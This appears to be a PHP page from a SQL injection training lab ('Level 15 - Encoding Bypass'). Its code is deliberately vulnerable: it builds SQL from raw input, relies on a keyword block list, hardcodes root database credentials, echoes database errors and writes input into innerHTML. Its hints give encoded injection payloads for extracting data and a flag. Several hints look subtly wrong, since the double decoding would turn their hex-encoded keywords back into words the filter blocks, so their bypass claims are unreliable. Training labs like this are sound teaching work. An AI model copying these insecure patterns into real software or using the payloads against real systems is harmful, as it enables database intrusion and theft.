<?php
$mysqli = new mysqli('db','root','rootpassword','sqli_lab');
$id = $_GET['id'] ?? '';

// URL decode and check for blocked keywords
if ($id !== '') {
    $decoded_id = urldecode($id);
    $blocked_keywords = ['union', 'select', 'or', 'and', 'script', 'javascript'];
    $id_lower = strtolower($decoded_id);

    $blocked = false;
    foreach ($blocked_keywords as $keyword) {
        if (strpos($id_lower, $keyword) !== false) {
            $blocked = true;
            break;
        }
    }

    if (!$blocked) {
        $sql = "SELECT username FROM users WHERE id = $decoded_id";
        $result = $mysqli->query($sql);

        if (!$result) {
            die('Error: '.$mysqli->error);
        }

        $row = $result->fetch_row();
        if ($row) {
            echo htmlspecialchars($row[0]);
        } else {
            echo 'No user found';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 15 - Encoding Bypass</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔤 Level 15 - Encoding Bypass</h1>
            <p><strong>Attack Type:</strong> Use various encoding techniques to bypass character-based filters</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE id = <?php 
            $id = $_GET['id'] ?? 'NULL';
            echo htmlspecialchars(urldecode($id));
            ?></div>
            
            <h3>🚨 Filter Rules:</h3>
            <div class="waf-warning">
                <strong>Process:</strong> URL decode → Check blocked keywords<br>
                <strong>Blocked keywords:</strong> union, select, or, and, script, javascript
            </div>
            
            <?php
            if (isset($_GET['id']) && $_GET['id'] !== '') {
                $id = $_GET['id'];
                $decoded_id = urldecode($id);
                
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                echo '<p><strong>Original input:</strong> ' . htmlspecialchars($id) . '</p>';
                echo '<p><strong>After URL decode:</strong> ' . htmlspecialchars($decoded_id) . '</p>';
                
                $blocked_keywords = ['union', 'select', 'or', 'and', 'script', 'javascript'];
                $id_lower = strtolower($decoded_id);

                $blocked = false;
                $blocked_keyword = '';
                foreach ($blocked_keywords as $keyword) {
                    if (strpos($id_lower, $keyword) !== false) {
                        $blocked = true;
                        $blocked_keyword = $keyword;
                        break;
                    }
                }

                if ($blocked) {
                    echo '<div class="error">🚨 Filter blocked: Keyword detected: ' . $blocked_keyword . '</div>';
                } else {
                    $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                    $sql = "SELECT username FROM users WHERE id = $decoded_id";
                    $result = $mysqli->query($sql);

                    if (!$result) {
                        echo '<div class="error">Error: '.$mysqli->error.'</div>';
                    } else {
                        $row = $result->fetch_row();
                        if ($row) {
                            echo '<strong>Username:</strong> ' . htmlspecialchars($row[0]);
                        } else {
                            echo 'No user found';
                        }
                    }
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Own Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="id">ID Parameter:</label>
                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding URL Encoding</h4>
                    <p>The filter URL decodes the input before checking for keywords.</p>
                    <p>Try: <code>1%20union</code> - This decodes to "1 union" and gets blocked.</p>
                    <p>We need double encoding or alternative methods.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Double URL Encoding</h4>
                    <p>Try double encoding to bypass single decode:</p>
                    <p>Try: <code>1%2520union</code> (double encoded space + union)</p>
                    <p>This decodes to "1%20union" which may not be detected as containing "union".</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Hex Encoding</h4>
                    <p>Use hex encoding for individual characters:</p>
                    <p>Try: <code>1%20%75%6e%69%6f%6e</code> (hex for "union")</p>
                    <p>u=75, n=6e, i=69, o=6f, n=6e</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Using Functions Without Keywords</h4>
                    <p>Since encoding might still be decoded, use functions:</p>
                    <p>Try: <code>1%20%4f%52%20%28%41%53%43%49%49%28%4d%49%44%28%28%44%41%54%41%42%41%53%45%28%29%29%2c%31%2c%31%29%29%3e%31%30%30%29</code></p>
                    <p>This is hex encoded: "OR (ASCII(MID((DATABASE()),1,1))>100)"</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload</h4>
                    <p>Extract the flag using hex encoding:</p>
                    <p><code>-1%20%4f%52%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%31%2c%43%4f%4e%43%41%54%28%30%78%37%65%2c%28%4d%49%44%28%28%4d%49%44%28%28%44%41%54%41%42%41%53%45%28%29%29%2c%31%2c%31%30%30%29%29%2c%31%2c%35%30%29%29%2c%30%78%37%65%29%29</code></p>
                    <p>This decodes to an EXTRACTVALUE payload that extracts database info.</p>
                    <p>For the flag specifically:</p>
                    <p><code>-1%20%4f%52%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%28%53%45%4c%45%43%54%20%66%6c%61%67%20%46%52%4f%4d%20%6c%65%76%65%6c%73%20%57%48%45%52%45%20%69%64%3d%31%35%29%2c%31%2c%31%29%29%3e%36%30%29</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level14.php">⬅️ Previous Level</a>
            <a href="level16.php">➡️ Next Level</a>
            <a href="submit.php?level=15">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('id').value;
        const codeBlock = document.querySelector('.code-block');
        try {
            const decoded = decodeURIComponent(input || 'NULL');
            codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + decoded;
        } catch(e) {
            codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + (input || 'NULL');
        }
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>
</body>
</html>
